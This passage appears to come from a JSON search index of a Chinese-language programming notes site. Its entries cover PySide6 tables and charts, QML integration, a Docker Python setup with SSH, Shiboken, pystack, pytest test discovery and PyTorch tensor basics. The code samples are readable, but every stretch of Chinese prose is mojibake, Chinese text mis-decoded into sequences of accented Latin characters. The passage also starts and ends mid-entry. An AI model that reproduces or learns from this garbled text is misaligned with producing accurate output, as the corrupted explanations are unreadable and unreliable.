å¤šç”¨ä¸åµŒå…¥å¼é¢†åŸŸ.","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pyserial.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pyserial.html"},{"title":"æ•°æ®å¯è§†åŒ–å·¥å…·","text":"ä»CSVè·å–æ•°æ® è¯»å–CSVæ•°æ®çš„å‡ ç§æ–¹å¼: ç›´æ¥è¯»å– ä½¿ç”¨ csv åº“: /docs/åç«¯/python/pythonæ ‡å‡†åº“/csv numpy: /docs/åç«¯/python/pythonä¸‰æ–¹åº“/numpy pandas: /docs/åç«¯/python/pythonä¸‰æ–¹åº“/pandas ä»¥ä½¿ç”¨ pandas ä¸ºä¾‹: import argparse import pandas as pd def read_data(fname): return pd.read_csv(fname) if __name__ == \"__main__\": options = argparse.ArgumentParser() options.add_argument(\"-f\", \"--file\", type=str, required=True) args = options.parse_args() data = read_data(args.file) print(data) æ•°æ®è¿‡æ»¤ QDateTime è®¾ç½®æ—¶é—´ QTimeZone è®¾ç½®æ—¶åŒº ä¾‹: import argparse import pandas as pd from PySide6.QtCore import QDateTime, QTimeZone def transform_date(utc, timezone=None): utc_fmt = \"yyyy-MM-ddTHH:mm:ss.zzzZ\" new_date = QDateTime().fromString(utc, utc_fmt) if timezone: new_date.setTimeZone(timezone) return new_date def read_data(fname): # Read the CSV content df = pd.read_csv(fname) # Remove wrong magnitudes df = df.drop(df[df.mag < 0].index) magnitudes = df[\"mag\"] # My local timezone timezone = QTimeZone(b\"Europe/Berlin\") # Get timestamp transformed to our timezone times = df[\"time\"].apply(lambda x: transform_date(x, timezone)) return times, magnitudes if __name__ == \"__main__\": options = argparse.ArgumentParser() options.add_argument(\"-f\", \"--file\", type=str, required=True) args = options.parse_args() data = read_data(args.file) print(data) ä½¿ç”¨ QMainWindow QMainWindow æ˜¯ä¸€ä¸ªé¢„å®šä¹‰çš„ GUI ä¸»ç•Œé¢æ¡†æ¶/ç»“æ„: æºç : from PySide6.QtCore import Slot from PySide6.QtGui import QAction, QKeySequence from PySide6.QtWidgets import QMainWindow class MainWindow(QMainWindow): def __init__(self): QMainWindow.__init__(self) self.setWindowTitle(\"Eartquakes information\") # Menu self.menu = self.menuBar() self.file_menu = self.menu.addMenu(\"File\") # Exit QAction exit_action = QAction(\"Exit\", self) exit_action.setShortcut(QKeySequence.Quit) exit_action.triggered.connect(self.close) self.file_menu.addAction(exit_action) # Status Bar self.status = self.statusBar() self.status.showMessage(\"Data loaded and plotted\") # Window dimensions geometry = self.screen().availableGeometry() self.setFixedSize(geometry.width() * 0.8, geometry.height() * 0.7) å¢åŠ  QTableView QTableView éœ€è¦ä¸€ä¸ªæ¨¡å‹æ¥æ˜¾ç¤ºæ•°æ®. å¯ä»¥ä½¿ç”¨ QAbstractTableModel çš„å®ä¾‹. æ³¨è§£ ä¹Ÿå¯ä»¥ä½¿ç”¨æ›´ä¾¿æ·çš„æ§ä»¶ QTableWidget. ç›¸å¯¹å‡å°‘ä»£ç é‡(ä¸ç”¨å†™æ•°æ®æ¨¡å‹), ä½†æ˜¯ä¹Ÿé™ä½äº†å¤§æ•°æ®æ—¶çš„æ€§èƒ½, ä¸å¤Ÿçµæ´». å¯¹äº QAbstractTableModel: headerData, å®ç°æ­¤æ–¹æ³•æ¥å®šä¹‰è¡¨æ ¼æ ‡é¢˜ rowCount, è¡¨æ ¼è¡Œæ•° columnCount, è¡¨æ ¼åˆ—æ•° ä¾‹, è‡ªå®šä¹‰æ•°æ®ç±» CustomTableModel from PySide6.QtCore import Qt, QAbstractTableModel, QModelIndex from PySide6.QtGui import QColor class CustomTableModel(QAbstractTableModel): def __init__(self, data=None): QAbstractTableModel.__init__(self) self.load_data(data) def load_data(self, data): self.input_dates = data[0].values self.input_magnitudes = data[1].values self.column_count = 2 self.row_count = len(self.input_magnitudes) def rowCount(self, parent=QModelIndex()): return self.row_count def columnCount(self, parent=QModelIndex()): return self.column_count def headerData(self, section, orientation, role): if role != Qt.DisplayRole: return None if orientation == Qt.Horizontal: return (\"Date\", \"Magnitude\")[section] else: return f\"{section}\" def data(self, index, role=Qt.DisplayRole): column = index.column() row = index.row() if role == Qt.DisplayRole: if column == 0: date = self.input_dates[row].toPython() return str(date)[:-3] elif column == 1: magnitude = self.input_magnitudes[row] return f\"{magnitude:.2f}\" elif role == Qt.BackgroundRole: return QColor(Qt.white) elif role == Qt.TextAlignmentRole: return Qt.AlignRight return None åˆ›å»ºè¡¨æ ¼: from PySide6.QtWidgets import (QHBoxLayout, QHeaderView, QSizePolicy, QTableView, QWidget) from table_model import CustomTableModel class Widget(QWidget): def __init__(self, data): QWidget.__init__(self) # Getting the Model self.model = CustomTableModel(data) # Creating a QTableView self.table_view = QTableView() self.table_view.setModel(self.model) # QTableView Headers self.horizontal_header = self.table_view.horizontalHeader() self.vertical_header = self.table_view.verticalHeader() self.horizontal_header.setSectionResizeMode( QHeaderView.ResizeToContents ) self.vertical_header.setSectionResizeMode( QHeaderView.ResizeToContents ) self.horizontal_header.setStretchLastSection(True) # QWidget Layout self.main_layout = QHBoxLayout() size = QSizePolicy(QSizePolicy.Preferred, QSizePolicy.Preferred) ## Left layout size.setHorizontalStretch(1) self.table_view.setSizePolicy(size) self.main_layout.addWidget(self.table_view) # Set the layout to the QWidget self.setLayout(self.main_layout) å¢åŠ å›¾ç‰‡è§†å›¾ QtCharts ä½¿ç”¨ QtCharts QChartView æ³¨è§£ åœ¨ QChartView å†…æ”¾ç½® QtCharts è®¾è®¡ä¸€ä¸ªç©ºçš„ å›¾è¡¨: from PySide6.QtCore import QDateTime, Qt from PySide6.QtGui import QPainter from PySide6.QtWidgets import (QWidget, QHeaderView, QHBoxLayout, QTableView, QSizePolicy) from PySide6.QtCharts import QChart, QChartView, QLineSeries, QDateTimeAxis, QValueAxis from table_model import CustomTableModel class Widget(QWidget): def __init__(self, data): QWidget.__init__(self) # Getting the Model self.model = CustomTableModel(data) # Creating a QTableView self.table_view = QTableView() self.table_view.setModel(self.model) # QTableView Headers self.horizontal_header = self.table_view.horizontalHeader() self.vertical_header = self.table_view.verticalHeader() self.horizontal_header.setSectionResizeMode(QHeaderView.ResizeToContents) self.vertical_header.setSectionResizeMode(QHeaderView.ResizeToContents) self.horizontal_header.setStretchLastSection(True) # Creating QChart self.chart = QChart() self.chart.setAnimationOptions(QChart.AllAnimations) # Creating QChartView self.chart_view = QChartView(self.chart) self.chart_view.setRenderHint(QPainter.Antialiasing) # QWidget Layout self.main_layout = QHBoxLayout() size = QSizePolicy(QSizePolicy.Preferred, QSizePolicy.Preferred) ## Left layout size.setHorizontalStretch(1) self.table_view.setSizePolicy(size) self.main_layout.addWidget(self.table_view) ## Right Layout size.setHorizontalStretch(4) self.chart_view.setSizePolicy(size) self.main_layout.addWidget(self.chart_view) # Set the layout to the QWidget self.setLayout(self.main_layout) ç»˜åˆ¶å›¾è¡¨ åœ¨ä¸Šä¸€èŠ‚ä½¿ç”¨ QtCharts çš„åŸºç¡€ä¸Š æ ¹æ®CSVæ–‡ä»¶çš„æ•°æ®æ¥ç»˜åˆ¶å›¾è¡¨ QLineSeries, æŠ˜çº¿å›¾ ä¾‹: from PySide6.QtCore import QDateTime, Qt from PySide6.QtGui import QPainter from PySide6.QtWidgets import (QWidget, QHeaderView, QHBoxLayout, QTableView, QSizePolicy) from PySide6.QtCharts import QChart, QChartView, QLineSeries, QDateTimeAxis, QValueAxis from table_model import CustomTableModel class Widget(QWidget): def __init__(self, data): QWidget.__init__(self) # Getting the Model self.model = CustomTableModel(data) # Creating a QTableView self.table_view = QTableView() self.table_view.setModel(self.model) # QTableView Headers resize = QHeaderView.ResizeToContents self.horizontal_header = self.table_view.horizontalHeader() self.vertical_header = self.table_view.verticalHeader() self.horizontal_header.setSectionResizeMode(resize) self.vertical_header.setSectionResizeMode(resize) self.horizontal_header.setStretchLastSection(True) # Creating QChart self.chart = QChart() self.chart.setAnimationOptions(QChart.AllAnimations) self.add_series(\"Magnitude (Column 1)\", [0, 1]) # Creating QChartView self.chart_view = QChartView(self.chart) self.chart_view.setRenderHint(QPainter.Antialiasing) # QWidget Layout self.main_layout = QHBoxLayout() size = QSizePolicy(QSizePolicy.Preferred, QSizePolicy.Preferred) # Left layout size.setHorizontalStretch(1) self.table_view.setSizePolicy(size) self.main_layout.addWidget(self.table_view) # Right Layout size.setHorizontalStretch(4) self.chart_view.setSizePolicy(size) self.main_layout.addWidget(self.chart_view) # Set the layout to the QWidget self.setLayout(self.main_layout) def add_series(self, name, columns): # Create QLineSeries self.series = QLineSeries() self.series.setName(name) # Filling QLineSeries for i in range(self.model.rowCount()): # Getting the data t = self.model.index(i, 0).data() date_fmt = \"yyyy-MM-dd HH:mm:ss.zzz\" x = QDateTime().fromString(t, date_fmt).toSecsSinceEpoch() y = float(self.model.index(i, 1).data()) if x > 0 and y > 0: self.series.append(x, y) self.chart.addSeries(self.series) # Setting X-axis self.axis_x = QDateTimeAxis() self.axis_x.setTickCount(10) self.axis_x.setFormat(\"dd.MM (h:mm)\") self.axis_x.setTitleText(\"Date\") self.chart.addAxis(self.axis_x, Qt.AlignBottom) self.series.attachAxis(self.axis_x) # Setting Y-axis self.axis_y = QValueAxis() self.axis_y.setTickCount(10) self.axis_y.setLabelFormat(\"%.2f\") self.axis_y.setTitleText(\"Magnitude\") self.chart.addAxis(self.axis_y, Qt.AlignLeft) self.series.attachAxis(self.axis_y) # Getting the color from the QChart to use it on the QTableView color_name = self.series.pen().color().name() self.model.color = f\"{color_name}\"","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pyside6_more-Data-visualization-tool.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pyside6_more-Data-visualization-tool.html"},{"title":"å·¥å…·/ç»“æ„ä»‹ç»","text":"PySide6é¡¹ç›® .ui æ§ä»¶å¸ƒå±€è®¾è®¡æ–‡ä»¶ .qrc èµ„æºæ–‡ä»¶ .qmltype æ§ä»¶å¼€å‘ç›¸å…³GUIå·¥å…· Widget å¼€å‘ ä¸€èˆ¬ç»˜åˆ¶å‰ç«¯ç•Œé¢æ—¶, ä½¿ç”¨GUIå·¥å…·æ‰‹åŠ¨ç»˜åˆ¶å…·æœ‰å®æ—¶å¯è§æ€§(ç›¸å¯¹äºæ‰‹å†™pyä»£ç å¼€å‘è€Œè¨€) è€Œæ­¤å·¥å…·åªæœ‰åœ¨æ‰‹åŠ¨ç”»ç•Œé¢æ—¶ä½¿ç”¨. pyside6-designer, GUIç•Œé¢å¼€å‘å·¥å…·, ç”Ÿæˆ .ui æ–‡ä»¶ pyside6-uic, å°† .ui æ–‡ä»¶è½¬æ¢ä¸º python ä»£ç  pyside6-rcc, to generate serialized data from .qrc resources files. Keep in mind these files can be used in other non-widget projects. æ³¨è§£ ç›´æ¥ä½¿ç”¨ pyside6-designer å³å¯å¯åŠ¨, è€Œä¸æ˜¯å»å®‰è£…ç›®å½•ä¸‹ç›´æ¥ç‚¹å¼€. å› ä¸ºæœ‰ä¸€äº›ç¯å¢ƒå˜é‡çš„åŠ è½½æ˜¯å¿…è¦çš„. è§ å·¥å…·å¯åŠ¨ QML å¼€å‘ pyside6-qmllint, éªŒè¯ .qmltype æ˜¯å¦å­˜åœ¨è¯­æ³•é”™è¯¯. pyside6-qmltyperegistrar, è¯»å– å…ƒç±»å‹æ–‡ä»¶ å¹¶ ç”ŸæˆåŒ…å«æ³¨å†Œè¿™äº›ç±»å‹ä¸ºç›¸å…³å® çš„æ–‡ä»¶ åŸæ–‡: to read metatypes files and generate files that contain the necessary code to register all the types marked with relevant macros. pyside6-qmlimportscanner, å®šä¹‰é¡¹ç›®éœ€è¦å¯¼å…¥çš„ QML æ¨¡å—, å¹¶å°†ç»“æœè£…è½½ä¸ºjsonæ•°ç»„. ç†è§£å¯èƒ½æœ‰ç‚¹é—®é¢˜, åŸæ–‡: to identify the QML modules imported from a project/QML files and dump the result as a JSON array. æœ‰è¯¯åé¢å®é™…ä½¿ç”¨äº†å†è¡¥å……. å…¶ä»–å·¥å…·/æŒ‡ä»¤ pyside6-assistant, æ‰“å¼€åœ¨çº¿æ–‡æ¡£(Qt Help) pyside6-genpyi, å°† Qt æ¨¡å—ç¼–è¯‘ä¸º .pyi æ–‡ä»¶. pyside6-metaobjectdump, æ‰“å°å…ƒç±»å‹ä¿¡æ¯çš„å·¥å…·, å…ƒç±»å‹ä¿¡æ¯ä» qmltyperegistrar ç”Ÿæˆçš„ JSON ä¸­è¯»å– pyside6-deploy, to deploy desktop applications in Linux, Windows and macOS environments. å·¥å…·å¯åŠ¨ éƒ¨åˆ†å·¥å…·æ˜¯ç›´æ¥æ”¾ç½®åˆ°python pipå®‰è£…ç›®å½•ä¸‹çš„, Windowsä¸‹ä½“ç°ä¸º .exe æ–‡ä»¶, Macä¸‹ä½“ç°ä¸º .app . ä¸å»ºè®®ç›´æ¥å»å®‰è£…ç›®å½•ä¸‹ç‚¹å‡»æ­¤æ–‡ä»¶è€Œå¯åŠ¨, è€Œæ˜¯ä½¿ç”¨ pyside6- å‰ç¼€, å› ä¸º, æœ‰éƒ¨åˆ†ç¯å¢ƒå˜é‡æ’ä»¶ç­‰éœ€è¦æ­£ç¡®åŠ è½½, å¦åˆ™ç›¸å…³éƒ¨åˆ†å¯èƒ½æ— æ³•æ­£å¸¸ä½¿ç”¨. æ¯”å¦‚, Mac å®‰è£…ç¯å¢ƒä¸‹çš„designeræ˜¯ Designer.app , ä½¿ç”¨ pyside6-designer æ¥å¯åŠ¨: (dev_venv) yanque@mbp14 project % ls /Users/yanque/project/python_venv/dev_venv/lib/python3.9/site-packages/PySide6 | grep Design Designer.app QtDesigner.abi3.so QtDesigner.pyi (dev_venv) yanque@mbp14 project % pyside6-designer Error: Qt Designer: The QWebEngineView custom widget plugin is disabled because it requires OpenGL/Software RHI (current: 6). Qt Designer: The QQuickWidget custom widget plugin is disabled because it requires OpenGL RHI (current: 6). Designer: ä¸ºç±» QQuickWidget çš„çª—å£éƒ¨ä»¶æ³¨å†Œçš„è‡ªå®šä¹‰çª—å£éƒ¨ä»¶å·¥å‚è¿”å› 0ã€‚ ** WARNING Factory failed to create \"QQuickWidget\" Qt Designer: The QWebEngineView custom widget plugin is disabled because it requires OpenGL/Software RHI (current: 6). while executing '/Users/yanque/project/python_venv/dev_venv/lib/python3.9/site-packages/PySide6/Designer.app/Contents/MacOS/Designer'","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pyside6_more-Project-Introduction.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pyside6_more-Project-Introduction.html"},{"title":"QML","text":"Qtè®¾è®¡çš„ä¸€ç§ç±»ä¼¼ CSS, JSON çš„è¯­è¨€, åŒæ—¶å…è®¸ JavaScript , ç”¨äºåˆ›å»º UI åº”ç”¨ å¯è¢«å…¶ä»–ç»„ä»¶é›†æˆ, å¯è¢« C++ ä»£ç ä½¿ç”¨. ç›¸å¯¹äºä¼ ç»Ÿ Python ä»£ç ä¸­ç¼–å†™æ–¹å¼è€Œè¨€, ä½¿ç”¨å£°æ˜å¼ QML æ›´è‡ªç„¶, ä¾¿æ·, å¼€å‘ UI éƒ¨åˆ†æ›´å¿«é€Ÿ. åœ¨å®˜ç½‘æ•™ç¨‹ä¸­, æ ‡é¢˜ä¸º Your First QtQuick/QML Application , ç§ä»¥ä¸º QtQuick å°±æ˜¯ QML. (å¾…è€ƒè¯) å®˜ç½‘åœ°å€:: Your First QtQuick/QML Application å¯ç”¨æ¨¡å— QtQml QtQuick ç»“æ„ ä¸€ä¸ª QML è‡³å°‘ç”±ä¸¤ä¸ªæ–‡ä»¶ç»„æˆ. QML UI æè¿°æ–‡ä»¶ åŠ è½½ QML çš„ Python ä»£ç æ–‡ä»¶ ä¾‹, ä¸€ä¸ªç®€å•çš„ QML æ–‡ä»¶ view.qml import QtQuick Rectangle { id: main width: 200 height: 200 color: \"green\" Text { text: \"Hello World\" anchors.centerIn: main } } QtQuick æ˜¯ä¸€ä¸ª QML æ¨¡å—. Python åŠ è½½ä»£ç  main.py import sys from PySide6.QtWidgets import QApplication from PySide6.QtQuick import QQuickView if __name__ == \"__main__\": app = QApplication() view = QQuickView() view.setSource(\"view.qml\") view.show() sys.exit(app.exec()) è¿è¡Œæ¡Œé¢åº”ç”¨æ—¶, åº”è¯¥åœ¨ show ä¹‹å‰åŠ å…¥æ›´æ–°å¤§å°çš„ä»£ç : view.setResizeMode(QQuickView.SizeRootObjectToView) view.show() æ•´åˆQMLåˆ°Python å®˜ç½‘åœ°å€: Python-QML integration å…¶å®ä¸ä¸Šé¢çš„ä¾‹å­åŸºæœ¬ä¸€è‡´. å°±æ˜¯å¤šäº†äº‹ä»¶çš„éƒ¨åˆ†. åŠ è½½ QML æ–‡ä»¶: if __name__ == '__main__': app = QGuiApplication(sys.argv) QQuickStyle.setStyle(\"Material\") engine = QQmlApplicationEngine() # Get the path of the current directory, and then add the name # of the QML file, to load it. qml_file = Path(__file__).parent / 'view.qml' engine.load(qml_file) if not engine.rootObjects(): sys.exit(-1) åªéœ€è¦ QQmlApplicationEngine æ¥åŠ è½½ QML æ–‡ä»¶. ä½¿ç”¨ @QmlElement å®šä¹‰ QML å®šä¹‰çš„æ§ä»¶ç›¸åº”çš„äº‹ä»¶: # To be used on the @QmlElement decorator # (QML_IMPORT_MINOR_VERSION is optional) QML_IMPORT_NAME = \"io.qt.textproperties\" QML_IMPORT_MAJOR_VERSION = 1 @QmlElement class Bridge(QObject): @Slot(str, result=str) def getColor(self, s): if s.lower() == \"red\": return \"#ef9a9a\" elif s.lower() == \"green\": return \"#a5d6a7\" elif s.lower() == \"blue\": return \"#90caf9\" else: return \"white\" @Slot(float, result=int) def getSize(self, s): size = int(s * 34) if size <= 0: return 1 else: return size @Slot(str, result=bool) def getItalic(self, s): if s.lower() == \"italic\": return True else: return False @Slot(str, result=bool) def getBold(self, s): if s.lower() == \"bold\": return True else: return False åœ¨ QML ä¸­å®šä¹‰ç›¸å…³éƒ¨åˆ†(ä¿¡å·ä¸æ§½): Bridge { id: bridge } æ¯”å¦‚, ç‚¹å‡»æŒ‰é’®ç›¸å…³éƒ¨åˆ†: RadioButton { id: italic Layout.alignment: Qt.AlignLeft text: \"Italic\" onToggled: { leftlabel.font.italic = bridge.getItalic(italic.text) leftlabel.font.bold = bridge.getBold(italic.text) leftlabel.font.underline = bridge.getUnderline(italic.text) } } ä»¥ä¸‹é…ç½®ä½¿ç”¨ style è§¦å‘: python main.py --style material è¿˜å¯ä»¥åŠ å…¥ .conf æ–‡ä»¶ qtquickcontrols2.conf [Controls] Style=Material [Universal] Theme=System Accent=Red [Material] Theme=Dark Accent=Red åŠ åˆ° .qrc æ–‡ä»¶: <!DOCTYPE RCC><RCC version=\"1.0\"> <qresource prefix=\"/\"> <file>qtquickcontrols2.conf</file> </qresource> </RCC> ç”Ÿæˆ Python ä»£ç : pyside6-rcc style.qrc > style_rc.py å¯¼å…¥åˆ° main.py import sys from pathlib import Path from PySide6.QtCore import QObject, Slot from PySide6.QtGui import QGuiApplication from PySide6.QtQml import QQmlApplicationEngine, QmlElement from PySide6.QtQuickControls2 import QQuickStyle import style_rc æºç ä¸‹è½½ view.qml: ../../../../../resources/code/pyside6/qml_example/view.qml main.py: ../../../../../resources/code/pyside6/qml_example/main.py é¢„è§ˆ : view.qml main.py ä½¿ç”¨ QtCreator ä¸‹è½½: <https://download.qt.io/snapshots/qtcreator/> æ³¨æ„å®‰è£…çš„æ—¶å€™éœ€è¦ä½¿ç”¨è´¦æˆ·, å» å®˜ç½‘ æ³¨å†Œä¸€ä¸ªè´¦æˆ·å³å¯. å®˜ç½‘ä½¿ç”¨æ•™ç¨‹: QML Application Tutorial ä¸æ•°æ®åº“(SQL)ç»“åˆ å®˜ç½‘: QML, SQL and PySide Integration Tutorial æœ‰æ—¶é—´æŒ‰ç…§æ•™ç¨‹è¯•è¯•","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pyside6_more-QML.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pyside6_more-QML.html"},{"title":"ä½¿ç”¨dockerå®‰è£…","text":"ä½¿ç”¨ æŒ‡å®šç‰ˆæœ¬å®‰è£… Python å¹¶è¿›å…¥: docker run --name python39 -itd -p 2222:22 python:3.9 docker exec -it python39 /bin/bash # å°±ä¸æ¢æºäº†, æ„Ÿè§‰ä¸‰æ–¹æºè¿˜ä¸å¦‚å®˜æ–¹æºå¿« apt update apt install vim ssh iproute2 rsync # vim /etc/ssh/sshd_config å…è®¸rootç™»å½• # æ›´æ–°å¯†ç  passwd # é…ç½® pip æº cd ~ mkdir .pip && cd .pip echo \"[global] index-url = https://pypi.douban.com/simple/ [install] trusted-host=pypi.douban.com \" >pip.conf pip install pyside6","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pyside6_more-Use-docker-installation.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pyside6_more-Use-docker-installation.html"},{"title":"Shiboken","text":"å®‰è£… pyside6 è‡ªå¸¦çš„æ¨¡å— å¯ä½¿ç”¨å…¶è®¿é—®ä¸€äº›å†…éƒ¨ä¿¡æ¯, ä¸€èˆ¬ç”¨äº debug ä½¿ç”¨ Shiboken åˆ›å»ºçš„å¯¹è±¡éƒ½æ˜¯ Python å¯¹è±¡ æ³¨è§£ å…¶å®å°±æ˜¯å°† C++ å¯¹è±¡è½¬æ¢ä¸ºå¯è°ƒç”¨çš„ Python å¯¹è±¡ ä¸€äº›å·¥å…·æ–¹æ³•: def isValid (obj) def wrapInstance (address, type) def getCppPointer (obj) def delete (obj) def isOwnedByPython (obj) def wasCreatedByPython (obj) def dump (obj) def disassembleFrame (marker) isValid wrapInstance getCppPointer delete isOwnedByPython wasCreatedByPython dump disassembleFrame","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pyside6_more-modules-Shiboken.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pyside6_more-modules-Shiboken.html"},{"title":"Shiboken Generator","text":"å®˜ç½‘:: Shiboken å¾…è¡¥å……","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pyside6_more-modules-Shiboken-generator.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pyside6_more-modules-Shiboken-generator.html"},{"title":"pystack","text":"pypi: https://pypi.org/project/pystack/ github: https://github.com/bloomberg/pystack æŸ¥çœ‹å…¶ä»–pythonè¿›ç¨‹å †æ ˆä¿¡æ¯ å®‰è£…, æ­¤è½¯ä»¶ä¾èµ–ä¸åº•å±‚cåº“, æ‰€ä»¥å¯¹äºlinux, macç­‰, éœ€è¦æå‰å®‰è£…ä¾èµ–åº“, å³ä½¿æ²¡æœ‰ä»æºç æ„å»º. macè¿™ä¸ªåº“å®‰è£…çš„æ—¶å€™ä¸€ç›´æ‰¾ä¸åˆ° elf.h, æ”¾å¼ƒ: In file included from src/pystack/_pystack.cpp:817: src/pystack/_pystack/elf_common.h:12:10: fatal error: 'elf.h' file not found #include <elf.h> &#94;~~~~~~","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pystack.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pystack.html"},{"title":"Pytestæµ‹è¯•ç”¨ä¾‹æŸ¥æ‰¾ä¸åˆ°é—®é¢˜","text":"æ£€æŸ¥æµ‹è¯•çš„å‡½æ•°æ˜¯ä¸æ˜¯ä»¥ test_ å¼€å¤´, ä¸” æµ‹è¯•å‡½æ•°æ‰€åœ¨æ–‡ä»¶åæ˜¯ä¸æ˜¯ä»¥ test_ å¼€å¤´æˆ– _test ç»“å°¾.","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pytest-common-problem-Pytest-test-case-cannot-find-the-problem.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pytest-common-problem-Pytest-test-case-cannot-find-the-problem.html"},{"title":"API","text":"torchæä¾›çš„API torch.empty() å£°æ˜ä¸€ä¸ªæœªåˆå§‹åŒ–çš„ Tensors çŸ©é˜µ. å¦‚åˆ›å»ºä¸€ä¸ª 5*3 çš„çŸ©é˜µ: x = torch.empty(5, 3) torch.rand() éšæœºåˆå§‹åŒ–ä¸€ä¸ªçŸ©é˜µ åˆ›å»ºä¸€ä¸ªéšæœºåˆå§‹åŒ–çš„ 5*3 çŸ©é˜µ: rand_x = torch.rand(5, 3) torch.zeros() åˆ›å»ºæ•°å€¼çš†ä¸º 0 çš„çŸ©é˜µ åˆ›å»ºä¸€ä¸ªæ•°å€¼çš†æ˜¯ 0ï¼Œç±»å‹ä¸º long çš„çŸ©é˜µ: zero_x = torch.zeros(5, 3, dtype=torch.long) torch.ones() åˆ›å»ºæ•°å€¼çš†ä¸º 1 çš„çŸ©é˜µ torch.tensor() ç›´æ¥ä¼ é€’ tensor æ•°å€¼æ¥åˆ›å»º tensor æ•°å€¼æ˜¯ [5.5, 3]: tensor1 = torch.tensor([5.5, 3]) print(tensor1) è¾“å‡ºç»“æœ: tensor([5.5000, 3.0000]) tensor.new_ones() é™¤äº†ä¸Šè¿°å‡ ç§æ–¹æ³•ï¼Œè¿˜å¯ä»¥æ ¹æ®å·²æœ‰çš„ tensor å˜é‡åˆ›å»ºæ–°çš„ tensor å˜é‡ï¼Œ è¿™ç§åšæ³•çš„å¥½å¤„å°±æ˜¯å¯ä»¥ä¿ç•™å·²æœ‰ tensor çš„ä¸€äº›å±æ€§ï¼Œ åŒ…æ‹¬å°ºå¯¸å¤§å°ã€æ•°å€¼å±æ€§ï¼Œé™¤éæ˜¯é‡æ–°å®šä¹‰è¿™äº›å±æ€§ã€‚ç›¸åº”çš„å®ç°æ–¹æ³•å¦‚ä¸‹: tensor.new_ones() # new_*() æ–¹æ³•éœ€è¦è¾“å…¥å°ºå¯¸å¤§å° å¦‚æ˜¾ç¤ºå®šä¹‰æ–°çš„å°ºå¯¸æ˜¯ 5*3ï¼Œæ•°å€¼ç±»å‹æ˜¯ torch.double: tensor2 = tensor1.new_ones(5, 3, dtype=torch.double) # new_* æ–¹æ³•éœ€è¦è¾“å…¥ tensor å¤§å° print(tensor2) è¾“å‡ºç»“æœ: tensor([[1., 1., 1.], [1., 1., 1.], [1., 1., 1.], [1., 1., 1.], [1., 1., 1.]], dtype=torch.float64) torch.randn_like(old_tensor) ä¿ç•™ç›¸åŒçš„å°ºå¯¸å¤§å° tensor.size() torch.Size æ˜¯å…ƒç»„(tuple)ç±»å‹ï¼Œæ‰€ä»¥æ”¯æŒæ‰€æœ‰çš„å…ƒç»„æ“ä½œ torch.add() åŠ æ³•å®ç°: torch.add(tensor1, tensor2, [out=tensor3]) tensor1.add_(tensor2) # ç›´æ¥ä¿®æ”¹ tensor å˜é‡, æœ‰åç¼€ _ æˆ–è€…ç›´æ¥: tensor3 = tensor1 + tensor2 æ³¨è§£ å¯ä»¥æ”¹å˜ tensor å˜é‡çš„æ“ä½œéƒ½å¸¦æœ‰ä¸€ä¸ªåç¼€ _, ä¾‹å¦‚: x.copy_(y) x.t_() éƒ½å¯ä»¥æ”¹å˜ x å˜é‡ torch.view() ä¿®æ”¹ tensor å°ºå¯¸ å¦‚: x = torch.randn(4, 4) y = x.view(16) # -1 è¡¨ç¤ºé™¤ç»™å®šç»´åº¦å¤–çš„å…¶ä½™ç»´åº¦çš„ä¹˜ç§¯ z = x.view(-1, 8) print(x.size(), y.size(), z.size()) è¾“å‡ºç»“æœ: torch.Size([4, 4]) torch.Size([16]) torch.Size([2, 8]) å¦‚æœ tensor ä»…æœ‰ä¸€ä¸ªå…ƒç´ ï¼Œå¯ä»¥é‡‡ç”¨ .item() æ¥è·å–ç±»ä¼¼ Python ä¸­æ•´æ•°ç±»å‹çš„æ•°å€¼: x = torch.randn(1) print(x) print(x.item()) è¾“å‡ºç»“æœ: tensor([0.4549]) 0.4549027979373932 torch.from_numpy(numpy_array) Numpy æ•°ç»„è½¬æ¢ä¸º Tensor åœ¨ CPU ä¸Šï¼Œé™¤äº† CharTensor å¤–çš„æ‰€æœ‰ Tensor ç±»å‹å˜é‡ï¼Œéƒ½æ”¯æŒå’Œ Numpyæ•°ç»„çš„ç›¸äº’è½¬æ¢æ“ä½œ torch.device(\"cuda\") å®šä¹‰ä¸€ä¸ª CUDA è®¾å¤‡å¯¹è±¡ è®¡ç®—å¹³å‡å€¼mean ä¸å¸¦å‚æ•°, è¡¨ç¤ºè®¡ç®—æ‰€æœ‰å…ƒç´ å¹³å‡å€¼ dim None, è¡¨ç¤ºè®¡ç®—æ‰€æœ‰å…ƒç´ å¹³å‡å€¼ 0, è¡¨ç¤ºåœ¨å¼ é‡çš„ç¬¬ä¸€ä¸ªç»´åº¦ï¼ˆåˆ—ï¼‰ä¸Šè¿›è¡Œæ“ä½œ 1, è¡¨ç¤ºåœ¨å¼ é‡çš„ç¬¬äºŒä¸ªç»´åº¦ï¼ˆè¡Œï¼‰ä¸Šè¿›è¡Œæ“ä½œ å¦‚: # åˆ›å»ºä¸€ä¸ªç¤ºä¾‹å¼ é‡ x = torch.tensor([[1, 2, 3], [4, 5, 6], [7, 8, 9]], dtype=torch.float64) # è®¡ç®—æ•´ä¸ªå¼ é‡çš„å¹³å‡å€¼ mean_all = x.mean() print(mean_all) # è¾“å‡º: tensor(5., dtype=torch.float64) # æ²¿ç€ç‰¹å®šç»´åº¦è®¡ç®—å¹³å‡å€¼ mean_dim0 = x.mean(dim=0) print(mean_dim0) # è¾“å‡º: tensor([4., 5., 6.], dtype=torch.float64) mean_dim1 = x.mean(dim=1) print(mean_dim1) # 